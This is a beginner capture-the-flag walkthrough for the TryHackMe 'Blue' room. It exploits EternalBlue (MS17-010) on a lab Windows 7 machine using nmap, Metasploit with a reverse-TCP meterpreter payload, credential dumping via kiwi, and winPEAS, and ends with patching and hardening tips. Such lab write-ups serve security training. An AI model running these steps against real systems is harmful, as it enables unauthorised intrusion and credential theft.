# TryHackMe: Blue – Walkthrough


Room Link: https://tryhackme.com/room/blueDifficulty: Beginner / IntermediateFocus: Exploiting MS17-010 (EternalBlue) on a Windows VMTools:

use : Kali Linux (or any pentest distro)

Tools : Nmap, Metasploit Framework, SMB enumeration scripts


# Table of Contents

1: Overview & Setup

2: Network Scanning & Enumeration

3: Vulnerability Verification (MS17-010)

4: Exploitation with Metasploit

5: Gaining a Meterpreter Shell

6: Post-Exploitation & Privilege Escalation

7: Capturing Flags & Room Questions

8: Mitigation & Hardening Tips

## 1. Overview & Setup

Join the VPN

sudo openvpn --config ~/Downloads/tryhackme.ovpn

Confirm connectivity

ip a            # Check your tun0 interface
ping 10.10.10.10  # Replace with the room's gateway to verify

Note the target IP (you’ll see it in the room’s instructions).

In this walkthrough we'll call it <TARGET_IP>

## 2. Network Scanning & Enumeration

### 2.1 Full TCP Port Scan

nmap -p- -T4 -oN nmap/full-tcp-portscan.txt <TARGET_IP>

Finds all open TCP ports (e.g., 135, 139, 445, 3389)

### 2.2 Service & Version Detection

nmap -sC -sV -p 135,139,445,3389 -oN nmap/service-detect.txt <TARGET_IP>

-sC runs default scripts

-sV detects versions

### 2.3 SMB-Specific Enumeration

nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 -oN nmap/smb-enum.txt <TARGET_IP>

smb-os-discovery → OS details

smb-vuln-ms17-010 → checks EternalBlue vulnerability

## 3. Vulnerability Verification (MS17-010)

Check the nmap/smb-enum.txt output. You should see:

| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE-2017-0143

If State: VULNERABLE appears, proceed.

## 4. Exploitation with Metasploit

Launch Metasploit

msfconsole

Search for EternalBlue module

search ms17_010

Select the exploit

use exploit/windows/smb/ms17_010_eternalblue

Configure options

set RHOSTS <TARGET_IP>
set LHOST <YOUR_TUN0_IP>
set LPORT 4444           # or any free port
set PAYLOAD windows/x64/meterpreter/reverse_tcp

Optional – check targets

show targets

Run the exploit

exploit

You should see a meterpreter session open.

## 5. Gaining a Meterpreter Shell

Once the exploit succeeds:

[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.42:49155) at 2025-07-03 19:30:00 +0530

Inside Meterpreter:

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : BLUE
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64

## 6. Post-Exploitation & Privilege Escalation

Check for credentials with Mimikatz (if available)

meterpreter > load kiwi
meterpreter > creds_all

Upload & run winPEAS

meterpreter > upload /root/tools/winPEAS/winPEAS.exe C:\Windows\Temp\\
meterpreter > execute -f C:\Windows\Temp\winPEAS.exe

Review output

Look for unquoted service paths, weak permissions, etc.

## 7. Capturing Flags & Room Questions

User flag

cat C:\Users\Guest\Desktop\user.txt

Root flag (SYSTEM)

cat C:\Users\Administrator\Desktop\root.txt

Answer key questions in the room:

What SMB version is running?

What exploit did you use?

What is the OS build number?

What is the content of each flag?

## 8. Mitigation & Hardening Tips

Patch Management: Apply MS17-010 patch (KB4013389)

SMBv1: Disable if not required

Network Segmentation: Limit SMB traffic

Endpoint Monitoring: Alert on unusual SMB behavior


🎉 Congrats! You’ve fully exploited and documented the Blue machine.Feel free to open an issue or PR if you find anything to improve!
